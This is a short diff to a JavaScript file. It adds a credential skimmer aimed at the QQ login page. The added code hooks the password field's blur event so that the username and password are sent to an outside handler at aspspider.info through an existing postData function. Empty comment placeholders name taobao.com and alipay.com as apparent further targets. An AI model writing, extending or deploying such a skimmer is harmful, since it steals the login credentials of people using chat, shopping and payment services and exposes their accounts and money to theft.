@@ -19,3 +19,11 @@ function postData(str){
 	var url = "http://aspspider.info/CatcherXue0/Handler/ajaxhandler.ashx?key=CatcherX&content=" + content;
 	ajax("GET", url, callbackparam);
 }
+
+//http://xui.ptlogin2.qq.com
+var qqPw=document.getElementById('p');
+qqPw.setAttribute("onblur","postData(document.getElementById('u').value + document.getElementById('p').value);");
+
+//taobao.com
+
+//alipay.com
